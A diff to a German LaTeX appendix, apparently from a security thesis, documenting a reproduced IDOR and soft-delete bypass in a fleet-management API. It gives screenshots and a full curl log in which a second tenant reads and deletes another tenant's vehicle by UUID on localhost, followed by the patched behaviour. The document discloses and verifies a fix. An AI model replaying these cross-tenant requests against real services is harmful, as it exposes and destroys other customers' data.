@@ -1,76 +1,438 @@
 \begin{appendix} %Anhang
-    \section{Bilddokumentation des Angriffs}
+    \section{Manuelle Reproduktion des Angriffs}
+    \label{app:reproduktion}
 
-    Dieser Anhang dokumentiert den Angriff zusätzlich anhand manueller Screenshots.
-    Die Abbildungen dienen nicht als eigenständiger Nachweis der Schwachstelle,
-    sondern als visuelle Ergänzung zur in Kapitel \ref{sec:analyse} beschriebenen
-    PoC-Analyse und zu den automatisierten Tests aus Kapitel \ref{sec:testing}.
+    Dieser Anhang dokumentiert den Angriff zusätzlich zu den automatisierten
+    Tests aus Kapitel \ref{sec:testing} anhand zweier manueller Läufe. Die
+    Abbildungen sind kein eigenständiger Nachweis der Schwachstelle
+    (diese Rolle übernehmen die Red/Green-Tests in \texttt{test\_idor.py}),
+    sondern eine anschauliche Ergänzung für Leser, die den Angriffspfad
+    nachvollziehen wollen, ohne die Testsuite laufen zu lassen.
+
+    Der Angriff wird in zwei Varianten geführt:
+    \begin{itemize}
+        \item Abschnitt \ref{app:ui-reproduktion} läuft in der regulären
+              Benutzeroberfläche (Next.js-Frontend) \textemdash{} wie ein
+              Angreifer mit Browser und Entwicklertools vorgehen würde.
+        \item Abschnitt \ref{app:curl-reproduktion} zielt direkt gegen
+              die HTTP-API mit \texttt{curl} \textemdash{} so lässt sich
+              der Angriff im Zweifel automatisiert wiederholen und es
+              wird gleichzeitig belegt, dass es sich nicht um einen
+              Darstellungsfehler des Clients, sondern um einen
+              serverseitigen Autorisierungsfehler handelt.
+    \end{itemize}
+
+    In beiden Varianten bezeichnet \enquote{Opfer} den legitimen Besitzer
+    der Daten (Mandant A) und \enquote{Angreifer} einen zweiten, davon
+    unabhängigen Mandanten B, der sich regulär an derselben Instanz
+    registriert hat.
 
     \subsection{UI-basierte Reproduktion}
+    \label{app:ui-reproduktion}
 
-    Die UI-Screenshots zeigen den Angriff in einer realistischen Benutzerperspektive:
-    Zunächst wird durch das Opfer ein Fahrzeug angelegt, danach wird dieses Objekt
-    durch einen Benutzer einer fremden Organisation ausserhalb seines erlaubten
-    Mandantenkontexts sichtbar gemacht beziehungsweise trotz Löschung weiterhin
-    angezeigt.
+    \subsubsection{Ausgangslage}
+
+    Das System wird unter \texttt{localhost:3000} im Browser geöffnet. Es
+    gibt zu diesem Zeitpunkt noch keine Benutzer.
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/initialseite.png}
+        \caption{Login-/Registrierungsseite der Anwendung.}
+        \label{fig:ui-initial}
+    \end{figure}
+
+    \subsubsection{Opfer legt Konto und Fahrzeug an}
+
+    Das Opfer registriert sich mit eigener Organisation
+    (Opfer GmbH) und legt im Fleet-Management ein Fahrzeug an.
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/opfer_registrieren.png}
+        \caption{Registrierung des Opfers als neue Organisation.}
+        \label{fig:ui-opfer-register}
+    \end{figure}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/opfer_dashboard.png}
+        \caption{Dashboard des Opfer-Mandanten nach dem Login.}
+        \label{fig:ui-opfer-dashboard}
+    \end{figure}
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=0.9\linewidth]{graphics/ui_attack/opfer_create_vehicle.png}
-        \caption{Das Opfer legt im Fleet-Management ein Fahrzeug an.}
+        \caption{Das Opfer legt ein Fahrzeug (\texttt{OPFER-001}) an.}
         \label{fig:ui-opfer-create-vehicle}
     \end{figure}
 
     \begin{figure}[H]
         \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/opfer_vehicles.png}
+        \caption{Fahrzeugliste des Opfers. Die URL zeigt die UUID des
+            neu erstellten Fahrzeugs, die der Angreifer im nächsten Schritt
+            benötigt.}
+        \label{fig:ui-opfer-vehicles}
+    \end{figure}
+
+    \subsubsection{Angreifer legt separates Konto an}
+
+    Der Angreifer registriert sich als unabhängige Organisation
+    (Angreifer GmbH). Sein Dashboard ist erwartungsgemäss leer, weil
+    seine Organisation keine Fahrzeuge besitzt.
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/angreifer_registrieren.png}
+        \caption{Registrierung des Angreifers als eigene Organisation.}
+        \label{fig:ui-angreifer-register}
+    \end{figure}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/angreifer_dashboard.png}
+        \caption{Leeres Dashboard des Angreifer-Mandanten unmittelbar nach
+            der Registrierung.}
+        \label{fig:ui-angreifer-dashboard}
+    \end{figure}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/ui_attack/angreifer_vehicles.png}
+        \caption{Fahrzeugliste des Angreifers \textendash{} ebenfalls leer.
+            Die Oberfläche bestätigt also korrekt, dass der Angreifer auf
+            dem Listenweg keine fremden Daten sehen kann.}
+        \label{fig:ui-angreifer-vehicles}
+    \end{figure}
+
+    \subsubsection{Cross-Tenant-Zugriff per Direkt-URL}
+
+    Der Angreifer wechselt in der Adresszeile des Browsers auf die
+    Detailseite des Opfer-Fahrzeugs. Die UUID wurde zuvor aus der URL des
+    Opfers kopiert (sie liesse sich auch durch Enumeration oder
+    Insiderwissen erhalten). Die Seite lädt den Datensatz und zeigt dem
+    Angreifer Fahrzeug, Kennzeichen und weitere Eigenschaften eines
+    fremden Mandanten an \textemdash{} genau der IDOR-Effekt aus Issue
+    \#5.
+
+    \begin{figure}[H]
+        \centering
         \includegraphics[width=0.9\linewidth]{graphics/ui_attack/angreifer_opfer_vehicle.png}
-        \caption{Der Angreifer kann das Fahrzeug des Opfers über die direkte Objekt-ID aufrufen.}
+        \caption{IDOR via Browser \textendash{} der Angreifer sieht das
+            Fahrzeug (\texttt{OPFER-001}) des fremden Mandanten, obwohl
+            sein eigener Tenant keine Fahrzeuge besitzt.}
         \label{fig:ui-angreifer-opfer-vehicle}
     \end{figure}
+
+    \subsubsection{Soft-Delete-Bypass in der UI}
+
+    Das Opfer löscht das Fahrzeug regulär über die Anwendung. In der
+    Listenansicht ist es danach nicht mehr sichtbar \textemdash{}
+    soweit korrekt, weil \texttt{get\_multi()} \texttt{deleted\_at}
+    schon vor dem Patch berücksichtigt hat. Der Angreifer ruft
+    aber weiterhin die Detail-URL mit der gleichen UUID auf. Die Seite
+    lädt den Datensatz trotz Soft-Delete, was die zweite Schwachstelle
+    (Issue \#14) zeigt.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=0.9\linewidth]{graphics/ui_attack/opfer_softdelete.png}
-        \caption{Soft-gelöschte Datensätze bleiben vor dem Patch in der Oberfläche weiterhin erreichbar.}
+        \caption{Der soft-gelöschte Datensatz bleibt vor dem Patch
+            über die direkte URL weiterhin erreichbar \textendash{} sowohl
+            für das Opfer selbst als auch für den Angreifer.}
         \label{fig:ui-softdelete}
     \end{figure}
 
     \subsection{API-Reproduktion mit curl}
+    \label{app:curl-reproduktion}
 
-    Die \texttt{curl}-Screenshots zeigen denselben Sachverhalt ohne Frontend. Dadurch
-    ist klar erkennbar, dass es sich nicht um ein Anzeigeproblem des Clients,
-    sondern um einen serverseitigen Autorisierungsfehler handelt. Das Opfer erzeugt
-    ein Fahrzeug, der Angreifer nutzt dessen UUID für einen fremden GET- und
-    DELETE-Zugriff, und das Objekt bleibt sogar nach einem Soft-Delete direkt per ID
-    lesbar.
+    Die folgende Sequenz zeigt denselben Angriff ohne Frontend. Die
+    Screenshots stammen aus einer realen Terminal-Session. Der volle
+    Wortlaut der Befehle und Antworten findet sich im Anschluss in
+    Abschnitt~\ref{app:terminal-log} und kann dort direkt in eine eigene
+    Shell übernommen werden.
+
+    \subsubsection{Opfer registrieren}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/curl_attack/opfer_registrieren.png}
+        \caption{Registrierung des Opfers per \texttt{POST /api/v1/auth/register}. Die
+            API liefert einen JWT zurück, den das Opfer für alle weiteren
+            Requests verwendet.}
+        \label{fig:curl-opfer-register}
+    \end{figure}
+
+    \subsubsection{Fahrzeug im Kontext des Opfers anlegen}
+
+    Mit dem JWT des Opfers wird \texttt{POST /api/v1/vehicles} aufgerufen.
+    Die Antwort enthält die UUID des neuen Fahrzeugs im Feld
+    \texttt{id}. Im Feld \texttt{organization\_id} steht die
+    Organisations-UUID des Opfers.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=0.9\linewidth]{graphics/curl_attack/opfer_create_vehicle.png}
-        \caption{Erzeugung eines Fahrzeugs im Kontext des Opfers per API.}
+        \caption{Erzeugung eines Fahrzeugs im Kontext des Opfers per
+            \texttt{POST /api/v1/vehicles}. Das Feld \texttt{id} wird als
+            \texttt{VID} für die späteren Angriffsaufrufe gespeichert.}
         \label{fig:curl-opfer-create-vehicle}
     \end{figure}
+
+    \subsubsection{Angreifer registrieren}
+
+    Der Angreifer registriert sich als zweite, unabhängige Organisation
+    \textendash{} wieder über die öffentliche
+    \texttt{/auth/register}-Route. Er erhält einen eigenen JWT mit einer
+    anderen \texttt{org\_id} im Payload.
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.9\linewidth]{graphics/curl_attack/angreifer_registrieren.png}
+        \caption{Registrierung des Angreifers mit eigener Organisation.
+            Der zurückgegebene JWT enthält eine andere
+            \texttt{org\_id} als der des Opfers.}
+        \label{fig:curl-angreifer-register}
+    \end{figure}
+
+    \subsubsection{Cross-Tenant-GET (IDOR, Issue \#5)}
+
+    Der Angreifer ruft \texttt{GET /api/v1/vehicles/\$VID} mit seinem
+    eigenen Bearer-Token, aber der UUID des Opfer-Fahrzeugs auf. Vor dem
+    Patch liefert der Endpunkt \texttt{200 OK} und den kompletten
+    Datensatz, inklusive der \texttt{organization\_id} des Opfers.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=0.9\linewidth]{graphics/curl_attack/use_vehicle_id.png}
-        \caption{Der Angreifer verwendet dieselbe UUID für einen unautorisierten GET-Zugriff.}
+        \caption{IDOR per API \textendash{} der Angreifer verwendet die
+            gestohlene UUID und erhält trotz fremdem JWT den vollen
+            Datensatz zurück.}
         \label{fig:curl-use-vehicle-id}
     \end{figure}
+
+    \subsubsection{Cross-Tenant-DELETE}
+
+    Weil \texttt{DELETE /\{id\}} dieselbe \texttt{get\_or\_404}-Methode
+    nutzt, kann der Angreifer das fremde Fahrzeug auch löschen. Der
+    Server antwortet mit \texttt{204 No Content}.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=0.9\linewidth]{graphics/curl_attack/angreifer_delete_vehicle.png}
-        \caption{Unautorisierter DELETE-Aufruf des Angreifers gegen das Fahrzeug des Opfers.}
+        \caption{Unautorisierter \texttt{DELETE}-Aufruf des Angreifers
+            gegen das Fahrzeug des Opfers. HTTP-Status \texttt{204}
+            signalisiert den Erfolg.}
         \label{fig:curl-delete-vehicle}
     \end{figure}
 
+    \subsubsection{Soft-Delete-Bypass (Issue \#14)}
+
+    Nach dem Löschen ruft der Angreifer die UUID noch einmal per GET
+    ab. Der Server liefert den soft-gelöschten Datensatz inklusive
+    gesetztem \texttt{deleted\_at}-Zeitstempel weiter aus und belegt
+    damit genau die zweite Schwachstelle aus Issue \#14.
+
     \begin{figure}[H]
         \centering
-        \includegraphics[width=0.9\linewidth]{graphics/curl_attack/vahicle_after_delete.png}
-        \caption{Das soft-gelöschte Fahrzeug bleibt vor dem Patch per direkter ID-Abfrage sichtbar.}
+        \includegraphics[width=0.9\linewidth]{graphics/curl_attack/vehicle_after_delete.png}
+        \caption{Das soft-gelöschte Fahrzeug bleibt vor dem Patch per
+            direkter ID-Abfrage sichtbar. Das Feld \texttt{deleted\_at}
+            ist zwar gesetzt, die Ressource wird aber trotzdem
+            ausgeliefert.}
         \label{fig:curl-vehicle-after-delete}
     \end{figure}
+
+    \subsection{Vollständiger Terminal-Log}
+    \label{app:terminal-log}
+
+    Der folgende Mitschnitt stammt aus einer realen Shell-Session gegen
+    einen lokal laufenden Backend-Container (\texttt{localhost:8000})
+    und dokumentiert den Angriff im Wortlaut. Die \texttt{\$}-Zeilen
+    sind Eingaben, alle übrigen Zeilen sind Server-Antworten. In den
+    beiden Fahrzeug-GETs wurden die für den Angriff irrelevanten
+    Null-Felder (etwa \texttt{vin}, \texttt{color} oder die
+    Versicherungsfelder) weggelassen. JWT-Tokens sind in der Form
+    \texttt{eyJh\ldots w6y28} gekürzt wiedergegeben, weil sie
+    andernfalls den Satzspiegel überschreiten würden. Sie sind
+    gleichwohl längst abgelaufen.
+
+    \subsubsection*{Opfer registriert sich und legt ein Fahrzeug an}
+
+\begin{lstlisting}[style=custombash, caption={Registrierung des Opfers und Anlage eines Fahrzeugs. Die UUID im Feld \texttt{id} wird vom Angreifer im nächsten Schritt als \texttt{VID} verwendet.}]
+$ curl -s -X POST http://localhost:8000/api/v1/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{"organization_name":"Opfer GmbH","email":"opfer@test.ch","password":"opfer1234","first_name":"Opfer","last_name":"Opfer"}' \
+  | python3 -m json.tool
+{
+    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MifQ...nGFyldvCw_a2PYoqyI8g3ppMy-7HKMOQUDtakFw6y28",
+    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWZyZXNoIn0...6Ckb14Y6Wa-KtxxHuUnVCBMN4mOjnnrRDNdtP43g35c",
+    "token_type": "bearer",
+    "expires_in": 31536000
+}
+
+$ export TOKEN=eyJhbGciOiJIUzI1Ni...nGFyldvCw_a2PYoqyI8g3ppMy-7HKMOQUDtakFw6y28
+
+$ curl -s -X POST http://localhost:8000/api/v1/vehicles \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"registration_plate":"OPFER-001","make":"Toyota","model":"Camry","year":1992,"type":"suv","fuel_type":"gasoline"}' \
+  | python3 -m json.tool
+{
+    "deleted_at": null,
+    "created_at": "2026-04-29T07:34:48.031902Z",
+    "updated_at": "2026-04-29T07:34:48.031902Z",
+    "registration_plate": "OPFER-001",
+    "vin": null,
+    "make": "Toyota",
+    "model": "Camry",
+    "year": 1992,
+    "type": "suv",
+    "fuel_type": "gasoline",
+    "status": "active",
+    "color": null,
+    "current_odometer": "0.00",
+    "fuel_capacity": null,
+    "image": null,
+    "insurance_expiry": null,
+    "insurance_provider": null,
+    "insurance_policy_number": null,
+    "registration_expiry": null,
+    "last_service_date": null,
+    "next_service_date": null,
+    "next_service_odometer": null,
+    "notes": null,
+    "id": "2dbd498a-e79b-4f71-8d0a-b1e785d7a718",
+    "organization_id": "6f2f1146-17b3-4b0f-853f-4827c5ee3421",
+    "assigned_employee_id": null,
+    "cost_center_id": null,
+    "average_fuel_efficiency": null,
+    "total_fuel_cost": "0.00",
+    "total_maintenance_cost": "0.00"
+}
+\end{lstlisting}
+
+    \subsubsection*{Angreifer registriert sich und liest das fremde Fahrzeug (IDOR)}
+
+\begin{lstlisting}[style=custombash, caption={Registrierung des Angreifer-Mandanten, Übernahme der Opfer-UUID in \texttt{VID} und unautorisierter GET auf das Fahrzeug des Opfers.}]
+$ curl -s -X POST http://localhost:8000/api/v1/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{"organization_name":"Angreifer GMBH","email":"angreifer@test.ch","password":"angreifer","first_name":"Angreifer","last_name":"Angreifer"}' \
+  | python3 -m json.tool
+{
+    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MifQ...K-bQ2hUZDbmDKtR-LoyaC4acJ2WRMkb3VqKqCU37aIw",
+    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWZyZXNoIn0...88-kv5IOgt01gYT57Psio3ajxnK7hxQIgsp8fUXgrDk",
+    "token_type": "bearer",
+    "expires_in": 31536000
+}
+
+$ export TOKEN=eyJhbGciOiJIUzI1Ni...K-bQ2hUZDbmDKtR-LoyaC4acJ2WRMkb3VqKqCU37aIw
+$ export VID=2dbd498a-e79b-4f71-8d0a-b1e785d7a718
+
+$ curl -s -X GET http://localhost:8000/api/v1/vehicles/$VID \
+  -H "Authorization: Bearer $TOKEN" \
+  | python3 -m json.tool
+{
+    "deleted_at": null,
+    "created_at": "2026-04-29T07:34:48.031902Z",
+    "updated_at": "2026-04-29T07:34:48.031902Z",
+    "registration_plate": "OPFER-001",
+    "vin": null,
+    "make": "Toyota",
+    "model": "Camry",
+    "year": 1992,
+    "type": "suv",
+    "fuel_type": "gasoline",
+    "status": "active",
+    "id": "2dbd498a-e79b-4f71-8d0a-b1e785d7a718",
+    "organization_id": "6f2f1146-17b3-4b0f-853f-4827c5ee3421"
+}
+\end{lstlisting}
+
+    \subsubsection*{Angreifer löscht das Fahrzeug und liest es erneut (Soft-Delete-Bypass)}
+
+\begin{lstlisting}[style=custombash, caption={Cross-Tenant-DELETE und anschliessender GET. Der Server antwortet auf den GET nach dem Soft-Delete weiter mit 200 OK und liefert den Datensatz inklusive gesetztem \texttt{deleted\_at}-Feld aus.}]
+$ curl -s -X DELETE http://localhost:8000/api/v1/vehicles/$VID \
+  -H "Authorization: Bearer $TOKEN" \
+  -w "\nHTTP-Status: %{http_code}\n"
+
+HTTP-Status: 204
+
+$ curl -s -X GET http://localhost:8000/api/v1/vehicles/$VID \
+  -H "Authorization: Bearer $TOKEN" \
+  | python3 -m json.tool
+{
+    "deleted_at": "2026-04-29T07:40:23.627920Z",
+    "created_at": "2026-04-29T07:34:48.031902Z",
+    "updated_at": "2026-04-29T07:40:23.620890Z",
+    "registration_plate": "OPFER-001",
+    "make": "Toyota",
+    "model": "Camry",
+    "year": 1992,
+    "type": "suv",
+    "fuel_type": "gasoline",
+    "status": "active",
+    "id": "2dbd498a-e79b-4f71-8d0a-b1e785d7a718",
+    "organization_id": "6f2f1146-17b3-4b0f-853f-4827c5ee3421"
+}
+\end{lstlisting}
+
+    \subsection{Ergänzende Kontrollabfragen}
+    \label{app:curl-commands}
+
+    Der kompakte Copy-Paste-Ablauf (Registrierung, Fahrzeug-Anlage,
+    Cross-Tenant-GET, Soft-Delete-Bypass) findet sich direkt im
+    Proof-of-Concept in Abschnitt~\ref{sec:poc}. Die folgenden beiden
+    Zusatzabfragen gehören nicht mehr zum Mindestnachweis der
+    Schwachstellen, sind aber nützlich, um das Verhalten der betroffenen
+    Endpunkte vollständig zu illustrieren.
+
+    \subsubsection*{Cross-Tenant-DELETE}
+
+\begin{lstlisting}[style=custombash, caption={Der Angreifer versucht, das fremde Fahrzeug zu löschen.}]
+# Vor dem Patch: 204 (Löschung erfolgreich, IDOR-Folgefehler)
+# Nach dem Patch: 204 (idempotent, aber ohne Seiteneffekt)
+curl -s -X DELETE http://localhost:8000/api/v1/vehicles/$VID \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -w "\nHTTP-Status: %{http_code}\n"
+\end{lstlisting}
+
+    \subsubsection*{Kontrollabfrage \textendash{} Liste filtert korrekt}
+
+\begin{lstlisting}[style=custombash, caption={Der Listenendpunkt war immer korrekt; der Bypass betrifft nur die Einzelabfrage per ID.}]
+# Liste zeigt das gelöschte Fahrzeug weder vor noch nach dem Patch
+curl -s http://localhost:8000/api/v1/vehicles \
+  -H "Authorization: Bearer $TOKEN_A" \
+  | python3 -m json.tool
+\end{lstlisting}
+
+    \subsection{Verhalten nach dem Patch}
+
+    Mit dem in Kapitel \ref{sec:implementierung} beschriebenen Patch
+    ändert sich das Ergebnis beider Varianten einheitlich:
+
+    \begin{itemize}
+        \item Der Angreifer erhält bei jedem \texttt{GET}, \texttt{PATCH}
+              oder \texttt{DELETE} auf eine fremde UUID eine
+              \texttt{404 Not Found}-Antwort. Aus seiner Sicht existiert
+              der Datensatz nicht \textemdash{} es gibt keinen
+              Unterschied zwischen \enquote{ID gibt es nicht} und
+              \enquote{ID gehört einem anderen Mandanten}. Dies vermeidet
+              auch Enumeration über Statuscode-Unterschiede.
+        \item Soft-gelöschte Datensätze führen beim Zugriff per UUID
+              ebenfalls zu \texttt{404}, sowohl für das Opfer als auch
+              für Dritte. Liste und Einzelabfrage verhalten sich danach
+              konsistent.
+        \item In der UI äussert sich das so, dass die Detailseite
+              \enquote{Fahrzeug nicht gefunden} anzeigt, statt fremde
+              Daten zu laden.
+    \end{itemize}
+
+    Den programmatischen Beleg dafür liefert die Testsuite in
+    \texttt{tests/test\_idor.py}, die genau diese beiden Zustände
+    (vor Patch FAILED, nach Patch PASSED) automatisiert prüft.
 
     %\includepdf[pages={1-2},nup=1x2,landscape=true,scale=0.85,offset=10 -40,pagecommand={\section{Eingefügtes Dokument; zwei Seiten auf einer}\label{app:Aufgabenstellung}\thispagestyle{myheadings}}]{appendix/aufgabenstellung.pdf} \newpage
 
@@ -81,5 +443,3 @@
 
     %%Bei mehrseitigen Dokumenten die folgenden Seiten ohne Überschrift:
     %\includepdf[pages={2-5},nup=1x1,landscape=true,scale=0.85,offset=0 -20,pagecommand={\thispagestyle{myheadings}}]{appendix/timeline_example.pdf} \newpage
-
-\end{appendix}
